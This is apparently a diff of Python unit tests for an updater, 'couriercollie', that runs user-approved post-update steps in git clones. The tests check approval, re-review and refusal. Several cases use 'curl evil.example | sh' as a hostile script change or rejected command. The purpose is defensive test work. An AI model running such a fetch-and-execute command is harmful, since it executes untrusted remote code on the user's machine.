@@ -90,85 +90,105 @@ class AfterUpdatingTest(UpstreamCase):
         self.push_upstream(text=f"update {self.updates}\n")
         self.backend.updateRepo(self.id)
 
-    def test_approved_once_then_each_update_applies_itself(self):
-        d = self.details()
-        self.assertEqual(d["stepSuggestions"], [{"label": "Run deploy.sh", "command": "/bin/sh ./deploy.sh"}])
-        # Its first line says /bin/sh; it isn't marked to be run itself.
-        review = self.backend.reviewStep(self.id, "/bin/sh ./deploy.sh")
-        self.assertIn("# ---- deploy.sh ----\n#!/bin/sh\necho deploying", review)  # the script itself, to read
-        self.backend.approveStep(self.id, "/bin/sh ./deploy.sh")
-        self.assertFalse((self.clone / "deployed.txt").exists())  # approving runs nothing
-        self.update()
-        d = self.details()
-        self.assertEqual((d["stepResult"], d["stepOutput"], d["applyReminder"]), ("applied", "deploying", ""))
-        self.assertTrue((self.clone / "deployed.txt").exists())  # ran in the clone's folder
-        saved = self.config.load(self.path).repos[0]
-        self.assertEqual((saved.apply_command, saved.script_run_at), ("/bin/sh ./deploy.sh", saved.installed))
+    def approved(self, command):
+        """A step approved before (as kept in the settings): any command, as earlier versions let one be typed."""
+        from couriercollie import applying
 
-    def test_a_changed_script_waits_to_be_looked_at_again(self):
-        self.backend.approveStep(self.id, "sh ./deploy.sh")
+        repo = self.repo()
+        repo.apply_command, repo.apply_approved = command, applying.fingerprint(str(self.clone), command)
+
+    def asked(self):
+        asks = []
+        self.backend.askStep.connect(lambda repo_id, why: asks.append(why))
+        return asks
+
+    def test_update_asks_first_then_does_the_whole_job(self):
+        asks = self.asked()
+        d = self.details()
+        self.assertEqual(d["stepChoices"], [{"label": "Run deploy.sh", "command": "/bin/sh ./deploy.sh", "what": "deploy.sh"}])
+        self.assertTrue(d["updateAsks"])
+        # Its first line says /bin/sh; it isn't marked to be run itself. Shown to read before choosing.
+        review = self.backend.reviewStep(self.id, "/bin/sh ./deploy.sh")
+        self.assertIn("# ---- deploy.sh ----\n#!/bin/sh\necho deploying", review)
+        self.update()  # the first time, Update asks what runs after it downloads: nothing is done yet
+        self.assertEqual((asks, self.repo().installed), (["update"], self.start))
+        self.backend.updateWithStep(self.id, "/bin/sh ./deploy.sh")  # (the window's Update)
+        d = self.details()
+        self.assertNotEqual(self.repo().installed, self.start)  # downloaded…
+        self.assertEqual((d["stepResult"], d["stepOutput"], d["updateAsks"]), ("applied", "deploying", False))
+        self.assertTrue((self.clone / "deployed.txt").exists())  # …and run, in the clone's folder
+        self.assertEqual(self.config.load(self.path).repos[0].apply_command, "/bin/sh ./deploy.sh")  # remembered
+        (self.clone / "deployed.txt").unlink()
+        self.update()  # from now on, one click does it all
+        self.assertEqual(asks, ["update"])
+        self.assertTrue((self.clone / "deployed.txt").exists())
+
+    def test_only_download(self):
+        asks = self.asked()
+        self.update()
+        self.backend.updateOnly(self.id)  # (the window's Only Download)
+        d = self.details()
+        self.assertNotEqual(self.repo().installed, self.start)
+        self.assertFalse((self.clone / "deployed.txt").exists())
+        self.assertEqual((d["stepSkip"], d["updateAsks"]), (True, False))
+        self.update()  # not asked again
+        self.assertEqual(asks, ["update"])
+        self.backend.approveStep(self.id, "/bin/sh ./deploy.sh")  # Change… later
+        self.assertFalse(self.details()["stepSkip"])
+
+    def test_only_a_choice_can_be_approved(self):
+        self.backend.approveStep(self.id, "curl evil.example | sh")  # nothing typed in
+        self.assertEqual(self.repo().apply_command, "")
+        self.backend.approveStep(self.id, "/bin/sh ./deploy.sh")
+        self.assertEqual(self.repo().apply_command, "/bin/sh ./deploy.sh")
+
+    def test_a_changed_script_asks_again_before_it_runs(self):
+        asks = self.asked()
+        self.backend.approveStep(self.id, "/bin/sh ./deploy.sh")
         self.update("#!/bin/sh\necho deploying\ncurl evil.example | sh\n")  # an update changes what it runs
         d = self.details()
-        self.assertTrue(d["stepChanged"])
-        self.assertEqual(d["stepResult"], "")  # not run
-        self.assertNotEqual(d["applyReminder"], "")  # still to be applied
+        self.assertEqual((asks, d["stepChanged"], d["stepResult"]), (["changed"], True, ""))  # asked; not run
         self.assertIn("curl evil.example", self.backend.reviewStep(self.id, d["step"]))  # the new text, to read
-        self.backend.runStep(self.id)  # Run Now is refused too, until approved again
+        self.backend.runStep(self.id)  # refused until approved again
         self.assertEqual(self.details()["stepResult"], "")
         (self.clone / "deploy.sh").write_text("#!/bin/sh\necho reviewed\n")  # (made harmless for the test)
-        self.backend.approveStep(self.id, "sh ./deploy.sh")
+        self.backend.approveStep(self.id, "/bin/sh ./deploy.sh")
         self.backend.runStep(self.id)
         self.assertEqual((self.details()["stepResult"], self.details()["stepChanged"]), ("applied", False))
 
     def test_a_new_update_forgets_how_the_step_went_before(self):
-        # Applied for the last version says nothing about this one, which waits to be looked at again.
         self.backend.approveStep(self.id, "/bin/sh ./deploy.sh")
         self.update()
         self.assertEqual(self.details()["stepResult"], "applied")
         self.update("#!/bin/sh\necho changed\n")
         d = self.details()
         self.assertEqual((d["stepChanged"], d["stepResult"], d["stepOutput"]), (True, "", ""))
-        self.assertNotEqual(d["applyReminder"], "")
 
-    def test_a_failed_step_says_so_and_isnt_applied(self):
-        self.backend.approveStep(self.id, "echo building; echo 'error: out of space' >&2; exit 3")
+    def test_a_failed_step_says_so(self):
+        self.approved("echo building; echo 'error: out of space' >&2; exit 3")
         self.update()
         d = self.details()
         self.assertEqual((d["stepResult"], d["stepCode"]), ("failed", 3))
         self.assertEqual(d["stepOutput"], "building\nerror: out of space")  # errors too, in order
-        self.assertNotEqual(d["applyReminder"], "")
-        self.assertNotEqual(self.repo().script_run_at, self.repo().installed)
 
-    def test_a_password_is_asked_for_in_a_terminal(self):
-        # sudo can't ask without a terminal: the step fails at once, and its command is offered to paste into one.
-        self.backend.approveStep(self.id, "echo 'sudo: a terminal is required to read the password' >&2; exit 1")
+    def test_a_password_none_was_given_for(self):
+        # The password window was closed (or couldn't be shown): stopped, with the command for a terminal instead.
+        self.approved("echo 'sudo: a terminal is required to read the password' >&2; exit 1")
         self.update()
         d = self.details()
         self.assertEqual(d["stepResult"], "password")
         self.assertEqual(d["stepTerminalLine"], f"cd {self.clone} && {d['step']}")
-        self.assertNotEqual(d["applyReminder"], "")  # applied once you've run it and said so (Mark as Applied)
 
     def test_nothing_can_be_typed_in(self):
         # A step that waits for input gets none, so it can't hang the page.
-        self.backend.approveStep(self.id, "read answer; echo \"got [$answer]\"")
+        self.approved("read answer; echo \"got [$answer]\"")
         self.backend.runStep(self.id)
         self.assertEqual(self.details()["stepOutput"], "got []")
-
-    def test_your_own_command_changed_and_removed(self):
-        self.backend.approveStep(self.id, "  echo one > out.txt  ")
-        self.assertEqual(self.details()["step"], "echo one > out.txt")
-        self.backend.approveStep(self.id, "echo two > out.txt")  # Change…
-        self.backend.runStep(self.id)
-        self.assertEqual((self.clone / "out.txt").read_text(), "two\n")
-        self.backend.removeStep(self.id)
-        self.assertEqual((self.details()["step"], self.details()["stepResult"]), ("", ""))
-        self.update()  # nothing runs; the reminder says it isn't applied
-        self.assertNotEqual(self.details()["applyReminder"], "")
 
     def test_approval_covers_what_make_reads(self):
         # "make install" names no file, but runs what the Makefile says: an update changing it waits to be approved.
         (self.clone / "Makefile").write_text("install:\n\techo installing\n")
-        self.backend.approveStep(self.id, "make install")
+        self.approved("make install")
         self.assertIn("# ---- Makefile ----", self.backend.reviewStep(self.id, "make install"))
         self.assertFalse(self.details()["stepChanged"])
         (self.clone / "Makefile").write_text("install:\n\tcurl evil.example | sh\n")
@@ -185,8 +205,9 @@ class AfterUpdatingTest(UpstreamCase):
     def test_not_for_what_isnt_a_clone(self):
         repo = self.repo()
         repo.local_path, repo.kind, repo.source = "", "AppImage", ""
-        self.backend.approveStep(self.id, "echo hi")
-        self.assertEqual((repo.apply_command, self.details()["afterUpdating"]), ("", False))
+        self.backend.approveStep(self.id, "/bin/sh ./deploy.sh")
+        d = self.details()
+        self.assertEqual((repo.apply_command, d["stepChoices"], d["updateAsks"]), ("", [], False))
 
 
 class StopStepTest(unittest.TestCase):
@@ -479,24 +500,15 @@ class UpdateClickedTest(UpstreamCase):
         self.assertEqual(self.backend._checks.results[self.id].status, self.checker.UP_TO_DATE)
         self.assertFalse(self.backend.repo(self.id)["updateAvailable"])
 
-    def test_nothing_known_to_run_no_after_updating(self):
-        # No script, containers or build folder, and no step chosen: nothing to offer, so no section (nor a box).
-        self.assertFalse(self.backend.details(self.id)["afterUpdating"])
+    def test_nothing_known_to_run_update_just_downloads(self):
+        # No script, containers or build folder: nothing to choose, so Update doesn't ask; it pulls.
+        asks = []
+        self.backend.askStep.connect(lambda repo_id, why: asks.append(why))
+        self.assertEqual((self.backend.details(self.id)["stepChoices"], self.backend.details(self.id)["updateAsks"]),
+                         ([], False))
         self.backend.updateRepo(self.id)
-        self.assertFalse(self.backend.details(self.id)["afterUpdating"])
-
-    def test_mark_as_applied(self):
-        # A step that didn't run (changed since it was approved): after an update, a reminder that a running program
-        # doesn't use it yet.
-        repo = self.backend._config.find(self.id)
-        repo.apply_command, repo.apply_approved = "true", "approved before it changed"
-        self.assertEqual(self.backend.details(self.id)["applyReminder"], "")
-        self.backend.updateRepo(self.id)
-        self.assertTrue(self.backend.details(self.id)["applyReminder"].startswith(
-            f"Updated to commit {self.newest[:7]}, but not in use yet"))
-        self.assertEqual(self.config.load(self.path).repos[0].updated_to, self.newest)  # kept
-        self.backend.markApplied(self.id)  # done by hand, or by the project's own updater
-        self.assertEqual(self.backend.details(self.id)["applyReminder"], "")
+        self.assertEqual(asks, [])
+        self.assertEqual(self.backend.details(self.id)["updateNote"], "Pulled 1 new commit.")
 
     def test_refresh_or_a_check_clears_the_note(self):
         from couriercollie import sources
@@ -599,13 +611,15 @@ class CloneTest(UpstreamCase):
         d = backend.details(self.id)
         self.assertTrue(d["canUpdate"] and d["installClones"])
         self.assertEqual(d["statusKind"], "notInstalled")
+        asks = []
+        backend.askStep.connect(lambda repo_id, why: asks.append(why))
         backend.updateRepo(self.id)
         d = backend.details(self.id)
         folder = Path(os.environ["COURIERCOLLIE_CLONES"]) / "project"
-        self.assertEqual(d["updateNote"], f"Cloned main into {folder}. To install it, choose its step under After "
-                                          "Updating, then Run Now.")
+        self.assertEqual(d["updateNote"], f"Cloned main into {folder}.")
         self.assertEqual(d["statusKind"], "current")
-        self.assertEqual([s["label"] for s in d["stepSuggestions"]], ["Run install.sh"])
+        # Cloned, with an install script: the page asks whether to run it (now, and after each update).
+        self.assertEqual(([s["label"] for s in d["stepChoices"]], asks), (["Run install.sh"], ["installed"]))
         self.assertFalse(d["installClones"])
         self.assertTrue(d["isClone"])
         from couriercollie import config
